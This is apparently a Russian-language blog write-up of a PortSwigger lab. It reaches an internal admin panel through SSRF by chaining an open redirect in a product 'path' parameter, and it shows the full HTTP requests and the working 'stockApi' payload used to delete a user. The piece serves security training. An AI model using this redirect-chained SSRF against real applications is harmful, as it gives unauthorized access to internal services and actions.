---
title: "SSRF with filter bypass via open redirection vulnerability"
date: 2025-07-22
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-filter-bypass-via-open-redirection"
classes: wide
---

Для решения лабы нужно удалить пользователя `carlos`, получив доступ к кабинету админа `http://192.168.0.12:8080/admin`.

```
https://0a810022044da5f780d2817c00320062.web-security-academy.net/
```

## Solution

Известно, что тут есть узявимость **SSRF**, а значит нужно найти запрос, который содержит в себе адрес удаленного сервиса. Немного погуляв по сайту, нашел следующий запрос:

```http
POST /product/stock HTTP/2
Host: 0a810022044da5f780d2817c00320062.web-security-academy.net
Cookie: session=4AvVEzAX1KGOlGpO61s28eqVOmczi6k8; session=FGHul2TxRLaPWelwgX7Kfvo7N9k4FwPu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a810022044da5f780d2817c00320062.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a810022044da5f780d2817c00320062.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Могу предположить, что через `stockApi` можно передать нужный адрес:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 48

"Invalid external stock check url 'Invalid URL'"
```

Ну не все так просто, как могло показаться(

На странице товара увидел кнопку `Next product`. Она отправляет следующий запрос:

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2
```

В параметре `path` указывается путь до нужно страницы. Попробую подставить путь до картинки:

```http
GET /product/nextProduct?currentProductId=1&path=/image/productcatalog/products/59.jpg HTTP/2
Host: 0a810022044da5f780d2817c00320062.web-security-academy.net
Cookie: session=67v801jAftj4fL192RkkEgHPX4BfYN95; session=FGHul2TxRLaPWelwgX7Kfvo7N9k4FwPu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a810022044da5f780d2817c00320062.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Ответ:

```http
HTTP/2 302 Found
Location: /image/productcatalog/products/59.jpg
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Меня перенаправило, а значит тут есть узявимость **Open redirection**. Попробую добавить `path=http://192.168.0.12:8080/admin` в запрос.


```http
POST /product/stock HTTP/2
Host: 0a810022044da5f780d2817c00320062.web-security-academy.net
Cookie: session=4AvVEzAX1KGOlGpO61s28eqVOmczi6k8; session=FGHul2TxRLaPWelwgX7Kfvo7N9k4FwPu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a810022044da5f780d2817c00320062.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a810022044da5f780d2817c00320062.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Ответ:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3177

...

```

Получил ответ. А в нем и нужный запрос для удаления пользователя.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_SSRF_with_filter_bypass_via_open_redirection_vulnerability/1.png){: height="200" .align-center}

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3019

...

```

Пользователь удален, а значит лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_SSRF_with_filter_bypass_via_open_redirection_vulnerability/2.png){: height="200" .align-center}